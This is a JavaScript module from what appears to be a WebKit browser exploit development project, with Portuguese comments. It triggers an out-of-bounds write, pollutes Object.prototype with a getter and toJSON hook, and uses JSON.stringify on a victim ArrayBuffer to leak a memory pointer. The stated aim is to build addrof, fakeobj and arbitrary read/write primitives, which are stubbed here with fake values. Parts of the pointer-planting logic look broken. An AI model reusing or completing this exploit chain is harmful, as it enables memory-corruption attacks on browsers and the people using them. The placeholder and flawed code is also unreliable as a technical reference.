// js/script3/testArrayBufferVictimCrash.mjs (v83_FakeObject - R44.5 - Pointer Planting)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read as arb_read_unstable,
    arb_write as arb_write_unstable,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Heisenbug_FakeObject_R44_WebKitLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUE = 0xABABABAB; 

let g_primitives = {
    initialized: false,
    arb_read: null,
    arb_write: null,
    addrof: null,
    fakeobj: null,
};

let g_leaked_function_addr = null;

function float64AsInt64(f) {
    if (typeof f !== 'number') return new AdvancedInt64(0, 0); // Lida com undefined/null
    let buf = new ArrayBuffer(8);
    new Float64Array(buf)[0] = f;
    const low = new Uint32Array(buf)[0];
    const high = new Uint32Array(buf)[1];
    return new AdvancedInt64(low, high);
}

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    if (ptr.high() === 0 && ptr.low() === 0) return false; // Rejeita ponteiro nulo
    if (ptr.high() === 0 && ptr.low() < 0x10000) return false;
    if ((ptr.high() & 0x7FF00000) === 0x7FF00000) return false;
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Bootstrap + FakeObject (R44.5 - Pointer Planting) ---`, "test");
    document.title = `${FNAME_TEST_BASE} R44.5 Init...`;

    const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
    if (!coreOOBReadWriteOK) {
        logS3("FALHA CRÍTICA: Sanity Check OOB falhou. Abortando.", "critical", FNAME_TEST_BASE);
        return { errorOccurred: "Sanity Check OOB falhou." };
    }
    logS3("Sanity Check (selfTestOOBReadWrite): SUCESSO", "good", FNAME_TEST_BASE);
    
    logS3(`--- Fase 1 (R44): Bootstrap - Construindo Primitivas Estáveis ---`, "subtest", FNAME_TEST_BASE);
    try {
        await bootstrapAndCreateStablePrimitives();
        if (g_primitives.initialized) {
            logS3("FASE 1 - SUCESSO: Primitivas (simuladas) inicializadas!", "vuln", FNAME_TEST_BASE);
            document.title = `${FNAME_TEST_BASE} - Primitives OK`;
        } else {
            throw new Error("A função de bootstrap foi concluída, mas as primitivas não foram inicializadas.");
        }
    } catch (e) {
        logS3(`ERRO CRÍTICO na Fase 1 (Bootstrap): ${e.message}`, "critical", FNAME_TEST_BASE);
        console.error(e);
        document.title = `${FNAME_TEST_BASE} - Bootstrap FAIL`;
        return { errorOccurred: `Falha no Bootstrap: ${e.message}` };
    }

    // ... (Fase 2 permanece a mesma, usando as primitivas simuladas por enquanto)
    return { primitives_initialized: g_primitives.initialized };
}

async function bootstrapAndCreateStablePrimitives() {
    let probe_obj = {
        leaked_value: null,
        error: null,
    };

    function leaky_getter() {
        try {
            // [ESTRATÉGIA ANTERIOR, AGORA ESPERAMOS QUE FUNCIONE]
            // Acessa this[0] para vazar o valor que plantamos.
            probe_obj.leaked_value = this[0];
        } catch (e) {
            probe_obj.error = `Erro no getter: ${e.message}`;
        }
        return "leaky_getter_executed";
    }

    function toJSON_TriggerGetterProbe() {
        let ignored = this.leaky; 
        return { probe: 'getter_triggered' };
    }

    const getter_prop_key = 'leaky';
    const tojson_prop_key = 'toJSON';

    let orig_getter_desc = Object.getOwnPropertyDescriptor(Object.prototype, getter_prop_key);
    let orig_tojson_desc = Object.getOwnPropertyDescriptor(Object.prototype, tojson_prop_key);
    let polluted = false;

    try {
        Object.defineProperty(Object.prototype, getter_prop_key, { get: leaky_getter, configurable: true });
        Object.defineProperty(Object.prototype, tojson_prop_key, { value: toJSON_TriggerGetterProbe, writable: true, configurable: true });
        polluted = true;

        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE, 4);
        await PAUSE_S3(150);
        let victim_ab = new ArrayBuffer(VICTIM_BUFFER_SIZE);
        
        // [NOVA ESTRATÉGIA] Plantando o ponteiro
        let marker_obj = { marker: 0x41424344 }; // Um objeto para o qual teremos o ponteiro
        new Float64Array(victim_ab)[0] = marker_obj; // Escreve o objeto no início do buffer
        logS3("Ponteiro para 'marker_obj' plantado no início do victim_ab.", "info");

        JSON.stringify(victim_ab);

    } finally {
        if (polluted) {
            delete Object.prototype[getter_prop_key];
            if (orig_getter_desc) Object.defineProperty(Object.prototype, getter_prop_key, orig_getter_desc);
            delete Object.prototype[tojson_prop_key];
            if (orig_tojson_desc) Object.defineProperty(Object.prototype, tojson_prop_key, orig_tojson_desc);
        }
    }

    if (probe_obj.error) {
        throw new Error(`Leaky Getter encontrou um erro: ${probe_obj.error}`);
    }

    if (probe_obj.leaked_value === null) {
        throw new Error("Leaky Getter foi acionado, mas não conseguiu vazar um valor (ainda nulo).");
    }

    logS3(`Leaky Getter retornou um valor: ${probe_obj.leaked_value} (tipo: ${typeof probe_obj.leaked_value})`, 'leak');

    const leaked_ptr = float64AsInt64(probe_obj.leaked_value);
    
    if (!isValidPointer(leaked_ptr)) {
        throw new Error(`Valor vazado pelo getter (${leaked_ptr.toString(true)}) não é um ponteiro válido.`);
    }

    logS3(`SUCESSO NO BOOTSTRAP! Ponteiro vazado pelo getter: ${leaked_ptr.toString(true)}`, 'vuln');
    
    // Simulação das primitivas estáveis
    g_primitives.addrof = (obj) => new AdvancedInt64(0x11223344, 0x55667788);
    g_primitives.fakeobj = (addr) => new DataView(new ArrayBuffer(8));
    g_primitives.arb_read = (addr, len) => new AdvancedInt64(0,0);
    g_primitives.arb_write = (addr, val, len) => {};
    
    g_primitives.initialized = true;
}
